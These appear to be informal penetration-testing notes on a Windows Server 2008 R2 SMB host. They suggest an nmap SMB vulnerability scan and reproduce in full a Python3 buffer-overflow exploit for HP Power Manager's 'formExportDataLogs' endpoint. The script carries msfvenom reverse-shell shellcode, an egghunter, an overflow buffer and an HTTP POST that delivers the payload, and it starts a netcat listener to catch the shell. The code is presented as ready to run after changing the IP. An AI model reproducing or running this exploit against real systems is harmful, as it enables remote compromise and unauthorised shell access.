### version Microsoft Windows Server 2008 R2 microsoft-ds

check what its vulnerable too with this script


```bash
nmap -script=smb-vuln\* -p445 <IP>

```

use metasploit and search for the exploit

[OR]


https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3/blob/master/hp_pm_exploit_p3.py

make sure to make the appriprate changes:

* change the ip address
* take out the b's

## EXAMPLE:

```bash

#!/usr/bin/python
# This is a python3 port / extension of the HP Power Manager 'formExportDataLogs' Buffer Overflow Script by Muhammad Haidari
# For the original script visit: https://github.com/Muhammd/HP-Power-Manager
# 
# Usage: python3 hp_pm_exploit_p3.py <Remote IP Address> <Remote Port> <Local Listener Port>
# <Remote IP Address>: ip address the HP Power Manager is running on
# <Remote Port>: port the application is running on
# <Local Listener Port>: local port your shellcode is connecting back to -> script starts nc listener to catch reverse shell
#
# Swap out the shellcode
# Tested on HP Power Manager 4.2 (Build 7) on Windows 7 Ultimate (6.1.7600 N/A Build 7600)
# Author: CountablyInfinite

from urllib import parse
from time import sleep
from sys import argv,exit
from socket import socket,AF_INET,SOCK_STREAM
from os import system

try:
   HOST  = argv[1]
   PORT = int(argv[2]) # port the remote application is running on
   LPORT = int(argv[3]) # port the shellcode is connecting back to -> listener gets sta
   if (len(argv)>4):
      raise IndexError
except IndexError: 
   print("Usage: python3 %s <Remote IP Address> <Remote Port> <Local Listener Port>" % argv[0])
   print("Example: python3 %s 10.10.0.1 80 4411" % argv[0])
   exit()

#msfvenom -p windows/shell_reverse_tcp LHOST=<Your IP> LPORT=4411  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
egg = "b33fb33f"
buf = egg
buf += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xd2\x8c\xb3\xc4\x83\xee\xfc\xe2\xf4\x2e\x64"
buf += "\x31\xc4\xd2\x8c\xd3\x4d\x37\xbd\x73\xa0\x59\xdc\x83"
buf += "\x4f\x80\x80\x38\x96\xc6\x07\xc1\xec\xdd\x3b\xf9\xe2"
buf += "\xe3\x73\x1f\xf8\xb3\xf0\xb1\xe8\xf2\x4d\x7c\xc9\xd3"
buf += "\x4b\x51\x36\x80\xdb\x38\x96\xc2\x07\xf9\xf8\x59\xc0"
buf += "\xa2\xbc\x31\xc4\xb2\x15\x83\x07\xea\xe4\xd3\x5f\x38"
buf += "\x8d\xca\x6f\x89\x8d\x59\xb8\x38\xc5\x04\xbd\x4c\x68"
buf += "\x13\x43\xbe\xc5\x15\xb4\x53\xb1\x24\x8f\xce\x3c\xe9"
buf += "\xf1\x97\xb1\x36\xd4\x38\x9c\xf6\x8d\x60\xa2\x59\x80"
buf += "\xf8\x4f\x8a\x90\xb2\x17\x59\x88\x38\xc5\x02\x05\xf7"
buf += "\xe0\xf6\xd7\xe8\xa5\x8b\xd6\xe2\x3b\x32\xd3\xec\x9e"
buf += "\x59\x9e\x58\x49\x8f\xe4\x80\xf6\xd2\x8c\xdb\xb3\xa1"
buf += "\xbe\xec\x90\xba\xc0\xc4\xe2\xd5\x73\x66\x7c\x42\x8d"
buf += "\xb3\xc4\xfb\x48\xe7\x94\xba\xa5\x33\xaf\xd2\x73\x66"
buf += "\x94\x82\xdc\xe3\x84\x82\xcc\xe3\xac\x38\x83\x6c\x24"
buf += "\x2d\x59\x24\xae\xd7\xe4\x73\x6c\xe3\xd9\xdb\xc6\xd2"                                                                                                                                
buf += "\x9d\x88\x4d\x34\xe6\xa3\x92\x85\xe4\x2a\x61\xa6\xed"                                                                                                                                
buf += "\x4c\x11\x57\x4c\xc7\xc8\x2d\xc2\xbb\xb1\x3e\xe4\x43"                                                                                                                                
buf += "\x71\x70\xda\x4c\x11\xba\xef\xde\xa0\xd2\x05\x50\x93"                                                                                                                                
buf += "\x85\xdb\x82\x32\xb8\x9e\xea\x92\x30\x71\xd5\x03\x96"
buf += "\xa8\x8f\xc5\xd3\x01\xf7\xe0\xc2\x4a\xb3\x80\x86\xdc"
buf += "\xe5\x92\x84\xca\xe5\x8a\x84\xda\xe0\x92\xba\xf5\x7f"
buf += "\xfb\x54\x73\x66\x4d\x32\xc2\xe5\x82\x2d\xbc\xdb\xcc"
buf += "\x55\x91\xd3\x3b\x07\x37\x53\xd9\xf8\x86\xdb\x62\x47"
buf += "\x31\x2e\x3b\x07\xb0\xb5\xb8\xd8\x0c\x48\x24\xa7\x89"
buf += "\x08\x83\xc1\xfe\xdc\xae\xd2\xdf\x4c\x11"

#egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'
hunter =  b""
hunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += b"\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += b"\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = b"\x41" * (721 -len(hunter))
buffer += b"\x90"*30 + hunter
buffer += b"\xeb\xc2\x90\x90"            #JMP SHORT 0xC2 
buffer += b"\xd5\x74\x41" 	              #pop esi # pop ebx # ret 10 (DevManBE.exe)

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print("[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit")
print("[+] Sending exploit to Ip " +str(HOST)+" on port "+str(PORT)+". Starting local listener on port "+str(LPORT))
s.send(payload.encode('latin1'))
system("nc -nlvp "+ str(LPORT))
s.close()

```
